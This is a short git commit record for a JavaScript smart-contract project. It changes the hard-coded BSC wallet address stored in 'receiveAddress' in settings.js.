43c352016180f769a695038b4241d3d9ae8b386a
l33th4x0r21 <l33th4x0r21@gmail.com>
2024-06-21 02:41:17 +0800

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0x581f1C054c3De598575a9CD60a7303aB3b0f3778";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
